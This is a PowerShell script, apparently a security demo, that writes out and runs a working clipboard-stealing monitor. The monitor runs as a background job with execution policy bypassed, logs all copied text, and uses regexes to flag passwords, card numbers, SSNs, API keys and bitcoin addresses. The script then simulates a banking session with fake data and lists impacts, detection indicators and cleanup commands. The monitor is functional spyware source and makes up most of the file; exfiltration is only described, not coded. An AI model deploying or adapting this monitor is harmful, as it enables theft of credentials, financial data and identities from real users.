# ========================================
# Clipboard Data Collection Simulation
# ========================================

$logPath = "C:\Users\Public\data\clipboard_log.txt"
$sensitiveData = "C:\Users\Public\data\sensitive_clipboard_data.txt"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Clipboard Hijacking Simulation" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[1/4] Creating clipboard monitor malware..." -ForegroundColor Yellow

$clipboardMonitor = @'
Add-Type -AssemblyName System.Windows.Forms

$logFile = "C:\Users\Public\data\clipboard_log.txt"
$sensitiveFile = "C:\Users\Public\data\sensitive_clipboard_data.txt"
$lastClipboard = ""
$duration = 30

$endTime = (Get-Date).AddSeconds($duration)

"=== Clipboard Monitoring Started ===" | Out-File $logFile -Force
"Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $logFile -Append
"Duration: $duration seconds" | Out-File $logFile -Append
"" | Out-File $logFile -Append

"=== Sensitive Data Captured ===" | Out-File $sensitiveFile -Force
"" | Out-File $sensitiveFile -Append

while ((Get-Date) -lt $endTime) {
    Start-Sleep -Milliseconds 500
    
    if ([System.Windows.Forms.Clipboard]::ContainsText()) {
        $current = [System.Windows.Forms.Clipboard]::GetText()
        
        if ($current -ne $lastClipboard -and $current.Length -gt 0) {
            $timestamp = Get-Date -Format "HH:mm:ss"
            $entry = "[$timestamp] Captured: $current"
            
            Write-Host $entry -ForegroundColor Red
            $entry | Out-File $logFile -Append
            
            # 민감정보 패턴 감지
            $patterns = @{
                'Password' = '(?i)(password|pwd|pass)[:=\s]+(\S+)'
                'Email' = '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                'Credit Card' = '\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'
                'SSN' = '\b\d{3}-\d{2}-\d{4}\b'
                'API Key' = '(?i)(api[_-]?key|token)[:=\s]+([A-Za-z0-9_\-]{20,})'
                'Bitcoin' = '\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
            }
            
            foreach ($patternName in $patterns.Keys) {
                if ($current -match $patterns[$patternName]) {
                    $alert = "[$timestamp] SENSITIVE: $patternName detected - $current"
                    Write-Host $alert -ForegroundColor Magenta
                    $alert | Out-File $sensitiveFile -Append
                }
            }
            
            $lastClipboard = $current
        }
    }
}

"" | Out-File $logFile -Append
"=== Monitoring Ended ===" | Out-File $logFile -Append
"Total duration: $duration seconds" | Out-File $logFile -Append
'@

$clipboardMonitor | Out-File "C:\Users\Public\data\clipboard_monitor.ps1" -Encoding UTF8
Write-Host "  Created clipboard_monitor.ps1" -ForegroundColor Red
Write-Host ""

Write-Host "[2/4] Simulating user activity..." -ForegroundColor Yellow
Write-Host ""
Write-Host "  User scenario: Online banking session" -ForegroundColor Cyan
Write-Host ""

# 백그라운드에서 클립보드 모니터 시작
$job = Start-Job -ScriptBlock {
    powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\data\clipboard_monitor.ps1"
}

Start-Sleep 2
Write-Host "  [MALWARE] Clipboard monitor running in background..." -ForegroundColor Red
Write-Host ""

# 사용자 행동 시뮬레이션
$userActions = @(
    @{Time=2; Action="User copies username"; Data="john.smith@email.com"},
    @{Time=2; Action="User copies password"; Data="MyP@ssw0rd123!"},
    @{Time=2; Action="User copies account number"; Data="1234-5678-9012-3456"},
    @{Time=2; Action="User copies API key"; Data="sk_live_51HxyzABCDEF1234567890"},
    @{Time=2; Action="User copies transaction info"; Data="Transfer $5000 to Account 9876543210"},
    @{Time=2; Action="User copies bitcoin address"; Data="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"},
    @{Time=2; Action="User copies SSN"; Data="123-45-6789"}
)

foreach ($action in $userActions) {
    Start-Sleep $action.Time
    
    Write-Host "  [USER] $($action.Action)" -ForegroundColor Yellow
    Set-Clipboard -Value $action.Data
    Write-Host "    Copied: $($action.Data)" -ForegroundColor Gray
    Start-Sleep 1
    Write-Host "  [MALWARE] Data intercepted!" -ForegroundColor Red
    Write-Host ""
}

Write-Host "  Waiting for monitoring to complete..." -ForegroundColor Gray
Wait-Job $job -Timeout 5 | Out-Null
Remove-Job $job -Force

Write-Host ""
Write-Host "[3/4] Analysis results..." -ForegroundColor Yellow
Write-Host ""

if (Test-Path $logPath) {
    Write-Host "Clipboard Activity Log:" -ForegroundColor Cyan
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    Get-Content $logPath
    Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
}

Write-Host ""

if (Test-Path $sensitiveData) {
    $content = Get-Content $sensitiveData
    if ($content.Length -gt 2) {
        Write-Host "Sensitive Data Captured:" -ForegroundColor Red
        Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
        Get-Content $sensitiveData
        Write-Host "═══════════════════════════════════════" -ForegroundColor Gray
    }
}

Write-Host ""
Write-Host "[4/4] Attack summary..." -ForegroundColor Yellow
Write-Host ""

$logContent = Get-Content $logPath -Raw
$capturedCount = ([regex]::Matches($logContent, "\[.*?\] Captured:")).Count

Write-Host "========================================" -ForegroundColor Green
Write-Host "   Clipboard Hijacking Complete" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

Write-Host "Statistics:" -ForegroundColor Yellow
Write-Host "  Monitoring duration: 30 seconds" -ForegroundColor White
Write-Host "  Clipboard captures: $capturedCount" -ForegroundColor Red
Write-Host "  Sensitive data found: Multiple types" -ForegroundColor Red
Write-Host ""

Write-Host "Captured Data Types:" -ForegroundColor Yellow
$dataTypes = @("Email address", "Password", "Credit card", "API key", "Bitcoin address", "SSN", "Transaction details")
foreach ($type in $dataTypes) {
    Write-Host "  ✓ $type" -ForegroundColor Red
}

Write-Host ""
Write-Host "Attack Scenario:" -ForegroundColor Yellow
Write-Host "  1. User visits online banking website" -ForegroundColor White
Write-Host "  2. User copies username (email)" -ForegroundColor White
Write-Host "  3. Malware intercepts clipboard" -ForegroundColor Red
Write-Host "  4. User copies password" -ForegroundColor White
Write-Host "  5. Malware captures credentials" -ForegroundColor Red
Write-Host "  6. User copies payment details" -ForegroundColor White
Write-Host "  7. Malware logs all sensitive data" -ForegroundColor Red
Write-Host "  8. Data exfiltrated to attacker" -ForegroundColor Red
Write-Host ""

Write-Host "Real-world Impact:" -ForegroundColor Yellow
Write-Host "  • Complete account takeover" -ForegroundColor Red
Write-Host "  • Financial fraud" -ForegroundColor Red
Write-Host "  • Identity theft" -ForegroundColor Red
Write-Host "  • Cryptocurrency theft" -ForegroundColor Red
Write-Host "  • API key compromise" -ForegroundColor Red
Write-Host ""

Write-Host "Detection Indicators:" -ForegroundColor Yellow
Write-Host "  • Unusual clipboard access" -ForegroundColor White
Write-Host "  • Background PowerShell processes" -ForegroundColor White
Write-Host "  • Suspicious file creation in Public folder" -ForegroundColor White
Write-Host "  • Unexpected data exfiltration" -ForegroundColor White
Write-Host ""

Write-Host "Files:" -ForegroundColor Cyan
Write-Host "  Monitor script: C:\Users\Public\data\clipboard_monitor.ps1"
Write-Host "  Activity log: $logPath"
Write-Host "  Sensitive data: $sensitiveData"
Write-Host ""

Write-Host "View logs:" -ForegroundColor Yellow
Write-Host "  Get-Content '$logPath'"
Write-Host "  Get-Content '$sensitiveData'"
Write-Host ""

Write-Host "Cleanup:" -ForegroundColor Yellow
Write-Host "  Remove-Item 'C:\Users\Public\data\clipboard_monitor.ps1' -Force"
Write-Host "  Remove-Item '$logPath' -Force"
Write-Host "  Remove-Item '$sensitiveData' -Force"
Write-Host ""

Write-Host "Current clipboard content (demo):" -ForegroundColor Cyan
$currentClip = Get-Clipboard -ErrorAction SilentlyContinue
if ($currentClip) {
    Write-Host "  '$currentClip'" -ForegroundColor Gray
}
Write-Host ""